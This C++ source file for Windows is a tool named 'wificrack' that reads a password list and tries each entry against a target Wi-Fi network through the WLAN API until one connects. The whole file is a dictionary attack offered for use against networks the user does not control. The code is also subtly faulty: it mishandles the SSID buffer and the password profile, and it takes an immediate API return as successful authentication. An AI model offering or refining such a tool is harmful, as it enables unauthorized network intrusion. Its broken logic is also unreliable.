#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>
#include <locale>
#include <codecvt>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

std::vector<std::wstring> lerSenhasDoArquivo(const std::wstring& nomeDoArquivo) {
    std::vector<std::wstring> senhas;
    std::wifstream arquivo(nomeDoArquivo);

    if (!arquivo) {
        std::wcerr << L"Erro ao abrir o arquivo de senhas." << std::endl;
        return senhas;
    }

    std::wstring linha;
    while (std::getline(arquivo, linha)) {
        senhas.push_back(linha);
    }

    arquivo.close();
    return senhas;
}

bool tentarConectar(HANDLE hClient, const GUID& interfaceGuid, const std::wstring& ssid, const std::wstring& senha) {
    WLAN_CONNECTION_PARAMETERS connectionParams;
    WLAN_RAW_DATA rawData;

    rawData.dwDataSize = static_cast<DWORD>(senha.size() * sizeof(WCHAR));
    rawData.pData = (PUCHAR)senha.c_str();

    connectionParams.wlanConnectionMode = wlan_connection_mode_temporary_profile;
    connectionParams.strProfile = nullptr;
    connectionParams.pDot11Ssid = new DOT11_SSID{ static_cast<DWORD>(ssid.size()), {} };
    memcpy(connectionParams.pDot11Ssid->ucSSID, ssid.c_str(), ssid.size() * sizeof(WCHAR));
    connectionParams.pDesiredBssidList = nullptr;
    connectionParams.dot11BssType = dot11_BSS_type_infrastructure;
    connectionParams.dwFlags = 0;
    connectionParams.pwlanConnectionParametersEap = nullptr;
    connectionParams.pEapConfig = &rawData;

    DWORD dwResult = WlanConnect(hClient, &interfaceGuid, &connectionParams, nullptr);
    delete connectionParams.pDot11Ssid;

    if (dwResult != ERROR_SUCCESS) {
        return false;
    }

    return true;
}

int main(int argc, char* argv[]) {
    if(argc < 3){
        std::cout << "Usage: wificrack.EXE <BSSID> <PASSWORDS.txt>" << std::endl;
        return 1;
    }
    
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    // Converter o primeiro argumento (nome da rede) para std::wstring
    std::wstring nomeDaRede = converter.from_bytes(argv[1]);
    // Converter o segundo argumento (arquivo de senhas) para std::wstring
    std::wstring arquivoDeSenhas = converter.from_bytes(argv[2]);

    HANDLE hClient = nullptr;
    DWORD dwVersion;
    DWORD dwResult;

    // Inicializar o cliente WLAN
    dwResult = WlanOpenHandle(2, nullptr, &dwVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        std::cout << "Erro ao abrir o handle do cliente WLAN." << std::endl;
        return 1;
    }

    // Enumerar todas as interfaces de rede sem fio
    PWLAN_INTERFACE_INFO_LIST pIfList = nullptr;
    dwResult = WlanEnumInterfaces(hClient, nullptr, &pIfList);
    if (dwResult != ERROR_SUCCESS) {
        std::cout << "Erro ao enumerar as interfaces WLAN." << std::endl;
        WlanCloseHandle(hClient, nullptr);
        return 1;
    }

    // Ler senhas do arquivo
    std::vector<std::wstring> senhas = lerSenhasDoArquivo(arquivoDeSenhas);

    // Tentar conectar com cada senha

    bool conectado = false;
    for (const auto& senha : senhas) {
        std::wcout << L"Tentando conectar com a senha: " << senha << std::endl;
        if (tentarConectar(hClient, pIfList->InterfaceInfo[0].InterfaceGuid, nomeDaRede, senha)) {
            std::wcout << L"Conectado com sucesso � rede Wi-Fi utilizando a senha: " << senha << std::endl;
            conectado = true;
            break;
        }
    }

    if (!conectado) {
        std::wcout << L"N�o foi poss�vel se conectar � rede Wi-Fi com as senhas fornecidas." << std::endl;
    }

    // Limpar
    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, nullptr);

    return 0;
}